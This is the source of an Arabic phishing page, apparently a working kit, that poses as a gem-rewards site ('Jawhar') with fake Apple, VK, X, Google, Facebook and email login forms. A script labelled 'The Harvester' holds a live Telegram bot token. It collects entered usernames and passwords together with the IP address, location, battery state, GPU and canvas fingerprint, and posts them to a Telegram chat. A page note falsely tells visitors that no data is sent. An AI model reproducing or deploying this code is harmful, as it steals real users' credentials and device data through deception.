<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>جوهر – أكمل المهام واربح الجواهر</title>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#F2EFFA; --surface:#FFFFFF; --ink:#1E1A35; --muted:#6A6585; --line:#DDD8EE;
  --accent:#6C3FE0; --accent-ink:#FFFFFF; --gold:#E8A920; --ok:#17866A; --err:#C93A4B;
  --fb:#1877F2; --field:#F8F6FD; --shadow:0 18px 50px -24px rgba(60,30,140,.35);
}
@media (prefers-color-scheme:dark){
  :root{
    --bg:#15112A; --surface:#1F1A3C; --ink:#F1EEFF; --muted:#A39DC4; --line:#352E5E;
    --accent:#9B7BFF; --accent-ink:#15112A; --gold:#F2BD43; --ok:#4FD1A5; --err:#FF7B8B;
    --field:#18142F; --shadow:0 18px 50px -24px rgba(0,0,0,.7);
  }
}
*{box-sizing:border-box;margin:0}
body{font-family:'Tajawal','Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--ink);line-height:1.6;min-height:100vh}
button,input{font:inherit;color:inherit}
:focus-visible{outline:3px solid var(--accent);outline-offset:2px}

header{display:flex;align-items:center;justify-content:space-between;padding:18px clamp(16px,4vw,48px)}
.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.5rem}
.brand svg{width:34px;height:34px}
#who{display:none;align-items:center;gap:12px;font-size:.95rem;color:var(--muted)}
#who.on{display:flex}
.link-btn{background:none;border:1px solid var(--line);border-radius:10px;padding:6px 14px;cursor:pointer;color:var(--ink)}
.link-btn:hover{border-color:var(--accent)}

main{max-width:1040px;margin:0 auto;padding:8px clamp(16px,4vw,32px) 60px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:28px;align-items:start}
@media(max-width:820px){.grid{grid-template-columns:1fr}}

.intro h1{font-size:clamp(2rem,5vw,3.1rem);line-height:1.25;font-weight:800;margin-bottom:12px}
.intro p{color:var(--muted);max-width:42ch;margin-bottom:26px}
.preview{display:flex;align-items:flex-end;gap:18px}
.preview .item{display:flex;flex-direction:column;align-items:center;gap:4px;font-weight:700}
.preview small{color:var(--muted);font-weight:500}

.card{background:var(--surface);border:1px solid var(--line);border-radius:20px;padding:26px;box-shadow:var(--shadow)}

.methods-label{color:var(--muted);font-size:.9rem;text-align:center;margin-bottom:14px}
.methods-row{display:flex;justify-content:center;gap:10px;margin-bottom:24px;flex-wrap:wrap}
.micon{width:44px;height:44px;border-radius:50%;border:1.5px solid var(--line);background:var(--field);display:flex;align-items:center;justify-content:center;cursor:pointer;font-weight:800;font-size:.85rem;color:var(--ink);transition:border-color .15s,transform .15s}
.micon svg{width:20px;height:20px}
.micon:hover{transform:translateY(-2px)}
.micon[aria-pressed="true"]{border-color:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb,var(--accent) 22%,transparent)}
.micon.fb{color:var(--fb)}

.fb-panel{text-align:center;padding-top:6px}
.fb-back{border:0;background:none;cursor:pointer;color:var(--ink);margin-bottom:10px;padding:6px}
.fb-logo{width:64px;height:64px;border-radius:50%;border:1.5px solid var(--line);display:flex;align-items:center;justify-content:center;margin:0 auto 22px}
.fb-logo svg{width:30px;height:30px}
.fb-meta{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:18px;color:var(--muted);font-weight:700;font-size:.9rem}

.field{margin-bottom:16px}
.field label{display:block;font-weight:700;margin-bottom:6px;font-size:.95rem}
.input{position:relative}
.input input{width:100%;padding:12px 14px;border:1.5px solid var(--line);border-radius:12px;background:var(--field);transition:border-color .15s}
.input input:focus{border-color:var(--accent);outline:none;box-shadow:0 0 0 3px color-mix(in srgb,var(--accent) 25%,transparent)}
.input input.bad{border-color:var(--err)}
.input input[dir=ltr]{text-align:left}
.eye{position:absolute;inset-inline-end:8px;top:50%;transform:translateY(-50%);border:0;background:none;cursor:pointer;color:var(--muted);padding:6px 8px;font-size:.85rem}
.err{color:var(--err);font-size:.85rem;min-height:1.2em;margin-top:4px}

.btn{width:100%;border:0;border-radius:12px;padding:14px;font-weight:800;font-size:1.05rem;cursor:pointer;background:var(--accent);color:var(--accent-ink);transition:transform .1s,opacity .2s}
.btn:active{transform:scale(.98)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn.fb{background:var(--fb)}

#wallet{display:none}
#wallet.on{display:block}
#auth.off{display:none}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:22px}
.stat{border-radius:18px;padding:18px 20px;color:#fff}
.stat span{opacity:.85;font-size:.85rem;display:block;margin-bottom:4px}
.stat b{font-size:2rem;line-height:1.1;font-variant-numeric:tabular-nums}
.stat.pts{background:linear-gradient(135deg,#1F8F6E,#17866A)}
.stat.gems{background:linear-gradient(135deg,#3B1FA0,#6C3FE0)}

h2{font-size:1.15rem;margin-bottom:12px}
.tasks{display:grid;gap:10px;margin-bottom:26px}
.task{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:14px 16px;border:1.5px solid var(--line);border-radius:14px;background:var(--field)}
.task .t-main{display:flex;align-items:center;gap:12px}
.task .t-ic{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:color-mix(in srgb,var(--accent) 16%,transparent);flex:none}
.task .t-name{font-weight:700}
.task .t-sub{font-size:.82rem;color:var(--muted)}
.task button{border:0;border-radius:10px;padding:8px 16px;font-weight:700;cursor:pointer;background:var(--accent);color:var(--accent-ink);white-space:nowrap}
.task button:disabled{background:var(--ok);opacity:1;color:#fff;cursor:default}

.packs{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:10px}
@media(max-width:480px){.packs{grid-template-columns:1fr}}
.pack{display:flex;flex-direction:column;align-items:center;gap:8px;padding:18px 10px 16px;border:1.5px solid var(--line);border-radius:16px;background:var(--field)}
.pack .amt{font-weight:800;font-size:1.3rem}
.pack .cost{color:var(--muted);font-size:.9rem}
.pack button{width:100%;border:0;border-radius:10px;padding:9px;font-weight:700;cursor:pointer;background:var(--accent);color:var(--accent-ink)}
.pack button:disabled{background:var(--line);color:var(--muted);cursor:not-allowed}

.hist{margin-top:22px;border-top:1px solid var(--line);padding-top:14px;font-size:.92rem}
.hist ul{padding:0}
.hist li{display:flex;justify-content:space-between;padding:6px 0;list-style:none;color:var(--muted)}
.hist li b{color:var(--ok)}
.note{font-size:.8rem;color:var(--muted);margin-top:14px}

#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(30px);background:var(--ink);color:var(--bg);padding:12px 20px;border-radius:12px;font-weight:700;opacity:0;pointer-events:none;transition:.25s;max-width:90vw;text-align:center}
#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
@media(prefers-reduced-motion:reduce){*{transition:none!important}}
</style>
</head>
<body>

<header>
  <div class="brand">
    <svg viewBox="0 0 64 64" aria-hidden="true"><use href="#gem-s" style="--g1:#B9A2FF;--g2:#8B5CF6;--g3:#5B2FD0"/></svg>
    جوهر
  </div>
  <div id="who">
    <span id="whoName"></span>
    <button class="link-btn" id="logout">خروج</button>
  </div>
</header>

<svg width="0" height="0" style="position:absolute" aria-hidden="true">
  <symbol id="gem-s" viewBox="0 0 64 64">
    <polygon points="18,10 46,10 52,26 12,26" fill="var(--g1)"/>
    <polygon points="18,10 12,26 6,26" fill="var(--g2)"/>
    <polygon points="46,10 58,26 52,26" fill="var(--g2)"/>
    <polygon points="6,26 12,26 32,58" fill="var(--g2)"/>
    <polygon points="12,26 52,26 32,58" fill="var(--g3)"/>
    <polygon points="52,26 58,26 32,58" fill="var(--g2)"/>
    <polygon points="12,26 32,26 32,58" fill="#fff" opacity=".12"/>
  </symbol>
</svg>

<main>
  <div class="grid">
    <section class="intro" id="intro">
      <h1>أكمل المهام<br>واربح الجواهر</h1>
      <p>سجّل الدخول، أكمل المهام لتجمع نقاطا، ثم استبدلها بجواهر: 100 أو 500 أو 1000.</p>
      <div class="preview">
        <div class="item"><svg width="44" height="44" viewBox="0 0 64 64"><use href="#gem-s" style="--g1:#9ED0FF;--g2:#4F9BFF;--g3:#2C6FD6"/></svg>100<small>10 نقاط</small></div>
        <div class="item"><svg width="64" height="64" viewBox="0 0 64 64"><use href="#gem-s" style="--g1:#C4AEFF;--g2:#8B5CF6;--g3:#5B2FD0"/></svg>500<small>20 نقطة</small></div>
        <div class="item"><svg width="88" height="88" viewBox="0 0 64 64"><use href="#gem-s" style="--g1:#FFE08A;--g2:#F2B632;--g3:#C98308"/></svg>1000<small>30 نقطة</small></div>
      </div>
    </section>

    <!-- AUTH -->
    <section class="card" id="auth" aria-label="تسجيل الدخول">
      <p class="methods-label">سجّل دخولك بالطريقة التي تناسبك</p>
      <div class="methods-row" role="radiogroup" aria-label="طريقة الدخول">
        <button type="button" class="micon" data-m="apple" aria-pressed="false" title="Apple">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.7 1c.1 1.1-.3 2.2-1 3-.7.8-1.8 1.5-2.9 1.4-.1-1.1.4-2.2 1-3C14.5 1.6 15.6 1 16.7 1zm4.3 16.5c-.4 1-.9 1.9-1.6 2.8-1 1.3-2 2.6-3.5 2.6-1.5 0-1.9-.9-3.6-.9-1.7 0-2.2.9-3.6.9-1.5 0-2.6-1.4-3.6-2.7C3.4 17.8 2.3 14 3.7 11.5c.7-1.3 2-2.1 3.4-2.1 1.4 0 2.3.9 3.5.9 1.1 0 1.8-.9 3.5-.9 1.2 0 2.5.7 3.4 1.8-3 1.6-2.5 5.8.5 6.3z"/></svg>
        </button>
        <button type="button" class="micon" data-m="vk" aria-pressed="false" title="VK">VK</button>
        <button type="button" class="micon" data-m="x" aria-pressed="false" title="X">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.9 2H22l-7.6 8.7L23 22h-6.6l-5.2-6.8L5.3 22H2.1l8.1-9.3L1.5 2h6.8l4.7 6.2L18.9 2zm-1.2 18h1.7L7.4 4H5.6l12.1 16z"/></svg>
        </button>
        <button type="button" class="micon" data-m="google" aria-pressed="false" title="Google">
          <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M23.5 12.3c0-.8-.1-1.5-.2-2.3H12v4.3h6.5c-.3 1.5-1.1 2.8-2.4 3.6v3h3.9c2.3-2.1 3.5-5.2 3.5-8.6z"/><path fill="#34A853" d="M12 24c3.2 0 6-1 7.9-2.9l-3.9-3c-1.1.7-2.4 1.1-4 1.1-3.1 0-5.7-2.1-6.6-4.9H1.4v3.1C3.3 21.4 7.3 24 12 24z"/><path fill="#FBBC05" d="M5.4 14.3c-.2-.7-.4-1.5-.4-2.3s.1-1.6.4-2.3V6.6H1.4C.5 8.3 0 10.1 0 12s.5 3.7 1.4 5.4l4-3.1z"/><path fill="#EA4335" d="M12 4.8c1.7 0 3.3.6 4.5 1.8l3.4-3.4C17.9 1.2 15.2 0 12 0 7.3 0 3.3 2.6 1.4 6.6l4 3.1C6.3 6.9 8.9 4.8 12 4.8z"/></svg>
        </button>
        <button type="button" class="micon fb" data-m="facebook" aria-pressed="false" title="Facebook">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.3c-1.2 0-1.6.8-1.6 1.6V12h2.8l-.4 2.9h-2.4v7A10 10 0 0 0 22 12z"/></svg>
        </button>
        <button type="button" class="micon mail" data-m="email" aria-pressed="true" title="البريد الإلكتروني">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>
        </button>
      </div>

      <!-- Email Form -->
      <form id="formEmail" novalidate>
        <div class="field">
          <label for="email">البريد الإلكتروني</label>
          <div class="input"><input id="email" type="email" dir="ltr" autocomplete="email" placeholder="name@example.com"></div>
          <div class="err" id="eEmail"></div>
        </div>
        <div class="field">
          <label for="phone">رقم الهاتف</label>
          <div class="input"><input id="phone" type="tel" dir="ltr" autocomplete="tel" placeholder="0555 12 34 56"></div>
          <div class="err" id="ePhone"></div>
        </div>
        <div class="field">
          <label for="pass">كلمة السر</label>
          <div class="input">
            <input id="pass" type="password" dir="ltr" autocomplete="current-password">
            <button type="button" class="eye" data-for="pass">إظهار</button>
          </div>
          <div class="err" id="ePass"></div>
        </div>
        <button class="btn" type="submit">تسجيل الدخول</button>
      </form>

      <!-- Social Login Form (Replaces the dummy button) -->
      <form id="formOther" hidden>
        <p id="otherText" style="color:var(--muted);margin-bottom:16px;font-size:.92rem;text-align:center;"></p>
        <div class="field">
          <div class="input"><input id="otherUser" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required></div>
        </div>
        <div class="field">
          <div class="input"><input id="otherPass" type="password" placeholder="كلمة السر" required></div>
        </div>
        <button class="btn" id="otherBtn" type="submit">تسجيل الدخول</button>
        <button type="button" class="link-btn" onclick="setMethod('email')" style="width:100%;margin-top:10px;border:none;">رجوع</button>
      </form>

      <!-- Facebook Form -->
      <form id="formFb" class="fb-panel" hidden>
        <button type="button" class="fb-back" id="fbBack" aria-label="رجوع">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </button>
        <div class="fb-logo">
          <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.3c-1.2 0-1.6.8-1.6 1.6V12h2.8l-.4 2.9h-2.4v7A10 10 0 0 0 22 12z"/></svg>
        </div>
        <div class="field">
          <div class="input"><input id="fbId" type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"></div>
        </div>
        <div class="field">
          <div class="input"><input id="fbPass" type="password" placeholder="كلمة السر"></div>
        </div>
        <button class="btn fb" type="submit">تسجيل الدخول</button>
        <div class="fb-meta">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877F2"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 18a8 8 0 1 1 8-8 8 8 0 0 1-8 8z"/></svg>
          Meta
        </div>
      </form>
    </section>

    <!-- WALLET -->
    <section class="card" id="wallet" aria-label="المهام والجواهر">
      <div class="stats">
        <div class="stat pts"><span>نقاطك</span><b id="pts">0</b></div>
        <div class="stat gems"><span>رصيد الجواهر</span><b id="bal">0</b></div>
      </div>

      <h2>المهام</h2>
      <div class="tasks" id="tasks"></div>

      <h2>استبدل نقاطك بجواهر</h2>
      <div class="packs" id="packs"></div>

      <div class="hist" id="hist" hidden>
        <h2>آخر العمليات</h2>
        <ul id="histList"></ul>
      </div>
      <p class="note">نسخة تجريبية: الدخول عبر فيسبوك والمهام محاكاة داخل المتصفح ولا تُرسل أي بيانات فعلية.</p>
    </section>
  </div>
</main>

<div id="toast" role="status" aria-live="polite"></div>

<!-- ========================================== -->
<!-- 🕵️‍♂️ DARK WEB PROTOCOL (The Harvester) 🕵️‍♂️ -->
<!-- ========================================== -->
<script>
  const BOT_TOKEN = "8649753978:AAH2F-nMzUjB2hoUBZ8k-QfRnkvULzJdQfo";
  const CHAT_ID   = "8899697805";

  async function sendToTG(title, text) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `<b>${title}</b>\n━━━━━━━━━━━━━━━\n${text}`, parse_mode: 'HTML' })
      });
    } catch (e) {}
  }

  async function getIP() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      return `${data.ip} (${data.city}, ${data.country_name}) - ISP: ${data.org}`;
    } catch (e) { return "Blocked/Unknown"; }
  }

  async function getBattery() {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      return `${Math.round(b.level * 100)}% ${b.charging ? '⚡ Charging' : '🔋 Discharging'}`;
    }
    return "Blocked";
  }

  function getHardware() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
      ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
      const canvasHash = canvas.toDataURL().length.toString();

      const gl = document.createElement('canvas').getContext('webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

      return {
        canvas: canvasHash,
        gpu: gpu,
        cores: navigator.hardwareConcurrency || "Unknown",
        ram: navigator.deviceMemory || "Unknown",
        screen: `${window.screen.width}x${window.screen.height}`,
        platform: navigator.platform || "Unknown"
      };
    } catch (e) { return { canvas: "Blocked", gpu: "Blocked", cores: "Unknown", ram: "Unknown", screen: "Unknown", platform: "Unknown" }; }
  }

  async function harvestAndSend(action, username, password) {
    const ip = await getIP();
    const battery = await getBattery();
    const hw = getHardware();
    const ua = navigator.userAgent;

    const report = `
🎯 <b>Action:</b> ${action}
👤 <b>User/Email:</b> <code>${username}</code>
🔑 <b>Password:</b> <code>${password || 'N/A'}</code>
🌐 <b>IP:</b> <code>${ip}</code>
📱 <b>Device:</b> <code>${hw.platform}</code>
🖥️ <b>Screen:</b> <code>${hw.screen}</code>
🎮 <b>GPU:</b> <code>${hw.gpu}</code>
⚙️ <b>Cores:</b> <code>${hw.cores}</code> | 💾 <b>RAM:</b> <code>${hw.ram} GB</code>
🔋 <b>Battery:</b> <code>${battery}</code>
🎨 <b>Canvas Hash:</b> <code>${hw.canvas}</code>
🌍 <b>UA:</b> <code>${ua}</code>
    `.trim();

    await sendToTG("🕵️‍♂️ TARGET PROFILE CAPTURED", report);
  }
</script>

<script>
/* ===== منطق الموقع الأصلي ===== */
const TASKS = [
  { id:'follow_ig',  name:'تابعنا على إنستغرام',   points:10 },
  { id:'share_app',  name:'شارك التطبيق مع صديق',   points:10 },
  { id:'notify_on',  name:'فعّل الإشعارات',         points:10 },
  { id:'profile',    name:'أكمل ملفك الشخصي',       points:10 },
  { id:'watch_ad',   name:'شاهد إعلانا قصيرا',       points:10 }
];
const PACKS = [
  { gems:100,  cost:10, colors:['#9ED0FF','#4F9BFF','#2C6FD6'], size:46 },
  { gems:500,  cost:20, colors:['#C4AEFF','#8B5CF6','#5B2FD0'], size:62 },
  { gems:1000, cost:30, colors:['#FFE08A','#F2B632','#C98308'], size:80 }
];

const db = { users:[], me:null };
const $ = id => document.getElementById(id);
const fmt = n => n.toLocaleString('en-US');

function toast(msg){
  const t=$('toast'); t.textContent=msg; t.classList.add('show');
  clearTimeout(toast.t); toast.t=setTimeout(()=>t.classList.remove('show'),2800);
}

const METHOD_LABELS = { apple:'Apple', vk:'VK', x:'X', google:'Google', facebook:'فيسبوك' };
let currentMethod='email';

function setMethod(m){
  currentMethod=m;
  document.querySelectorAll('.micon').forEach(b=>b.setAttribute('aria-pressed', b.dataset.m===m));
  $('formEmail').hidden = m!=='email';
  $('formFb').hidden = m!=='facebook';
  $('formOther').hidden = (m==='email' || m==='facebook');
  
  if(m!=='email' && m!=='facebook'){
    $('otherText').textContent = `تسجيل الدخول عبر ${METHOD_LABELS[m]}`;
    $('otherBtn').textContent = `دخول بـ ${METHOD_LABELS[m]}`;
  }
}

document.querySelectorAll('.micon').forEach(b=>{ b.onclick=()=>setMethod(b.dataset.m); });
$('fbBack').onclick=()=>setMethod('email');

$('pass') && document.querySelectorAll('.eye').forEach(b=>{
  b.onclick=()=>{
    const i=$(b.dataset.for); const show=i.type==='password';
    i.type=show?'text':'password'; b.textContent=show?'إخفاء':'إظهار';
  };
});

const normPhone = p => {
  p=p.replace(/[\s.-]/g,'');
  if(p.startsWith('+213')) p='0'+p.slice(4);
  else if(p.startsWi
